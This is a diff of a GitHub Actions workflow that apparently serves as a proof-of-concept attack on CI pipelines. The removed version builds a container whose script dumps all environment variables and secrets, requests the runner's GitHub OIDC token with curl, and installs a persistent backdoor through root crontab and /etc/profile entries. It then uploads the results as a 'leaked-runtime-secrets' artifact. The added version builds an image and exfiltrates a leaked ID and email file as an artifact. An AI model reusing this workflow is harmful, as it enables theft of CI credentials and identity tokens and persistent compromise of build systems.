@@ -1,55 +1,28 @@
-name: Critical RCE at Runtime
-on: [push]
+name: Leak Email and ID
+
+on:
+  workflow_dispatch:
 
 jobs:
-  exploit:
+  leak:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      id-token: write
-
     steps:
-      - name: Checkout repo
-        uses: actions/checkout@v4
+      - name: Checkout
+        uses: actions/checkout@v3
 
-      - name: Create Dockerfile
+      - name: Build Docker Image
         run: |
-          mkdir -p taskcluster/docker/python
-          cat <<EOF > taskcluster/docker/python/Dockerfile
-          FROM alpine
-          COPY run.sh /run.sh
-          RUN chmod +x /run.sh
-          CMD ["/run.sh"]
-          EOF
+          docker build . --build-arg PYTHON_VERSION='3.9' -t myimage
 
-      - name: Create Payload (run.sh)
+      - name: Extract Leaked Info
         run: |
-          cat <<EOF > taskcluster/docker/python/run.sh
-          #!/bin/sh
-          echo "[*] Dumping CI ENV and Secrets..."
-          echo "==== ENV ====" > /leak.txt
-          printenv >> /leak.txt
+          mkdir -p leaked
+          docker create --name tmp_container myimage
+          docker cp tmp_container:/tmp/id_email_leak.txt leaked/
+          docker rm tmp_container
 
-          echo "[*] Trying to access GitHub OIDC Token..."
-          echo "==== ID_TOKEN ====" >> /leak.txt
-          curl -sSL "\$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> /leak.txt || echo "OIDC token fetch failed" >> /leak.txt
-
-          echo "[*] Installing persistent backdoor..."
-          echo '#!/bin/sh' > /usr/local/bin/init.sh
-          echo 'printenv >> /runtime.log' >> /usr/local/bin/init.sh
-          chmod +x /usr/local/bin/init.sh
-          echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root
-          echo "/usr/local/bin/init.sh" >> /etc/profile
-          EOF
-
-      - name: Build Docker image
-        run: docker build -t runtime-pwn ./taskcluster/docker/python
-
-      - name: Execute container and dump secrets
-        run: docker run --rm runtime-pwn > output.txt
-
-      - name: Upload output
-        uses: actions/upload-artifact@v4
+      - name: Upload Leaked Data
+        uses: actions/upload-artifact@v2
         with:
-          name: leaked-runtime-secrets
-          path: output.txt
+          name: id-email-artifact
+          path: leaked/
